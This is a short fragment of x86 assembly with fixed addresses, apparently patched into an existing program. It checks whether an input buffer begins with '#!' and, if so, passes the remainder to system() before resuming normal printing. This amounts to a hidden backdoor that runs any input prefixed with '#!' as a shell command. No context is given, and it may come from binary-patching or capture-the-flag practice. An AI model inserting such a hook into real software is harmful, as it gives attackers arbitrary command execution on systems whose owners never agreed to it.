mov esi, 0x08048662;
jmp esi;
mov al, 0x23;                   # '#!'
mov ah, 0x21;                   # '#!'
mov ecx, 2;
lea edx, byte ptr [ebp - 0x40C];
mov edi,edx;
SCASW;
jne 0x6d;                       # before print
sub esp, 4;
lea edx, [ebp - 0x40A];         # without the '#!'
push edx;
mov esi, 0x08048460;
call esi;                       # call _system
add esp, 4;
mov esi, 0x08048651;
jmp esi;                        # after print